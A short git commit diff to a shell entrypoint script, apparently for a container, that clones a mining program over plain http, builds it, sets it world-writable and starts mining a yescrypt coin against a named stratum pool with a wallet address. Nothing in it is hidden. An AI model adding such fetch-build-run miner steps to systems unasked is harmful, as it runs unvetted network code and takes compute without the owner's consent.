a381b71e0f716b2c2cebe1dad911f1eaf2a2f9d1
wojiaoluyuan <lu321yuan@gmail.com>
2019-04-01 16:55:08 +0000

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,9 +1,11 @@
 cd /cpuminer
 
-    git clone https://github.com/tpruvot/cpuminer-multi.git
+    git clone http://github.com/bogdanadnan/multiminer
   
-    cd cpuminer-multi 
-    chmod 777 build.sh
-    ./build.sh
-    chmod 777 cpuminer
-    ./cpuminer -a yescrypt -o stratum+tcp://www.koto-note.xyz:3032 -u jzyoPToY94CM6K92StJUgTeFsF8bqG5BrAR.sx2 -p x
+    cd multiminer
+    mkdir build
+    cd build
+    cmake ..
+    make
+    chmod 777 multiminer
+    ./multiminer -a yescrypt -o stratum+tcp://www.koto-note.xyz:3032 -u jzyoPToY94CM6K92StJUgTeFsF8bqG5BrAR.sx2 -p x
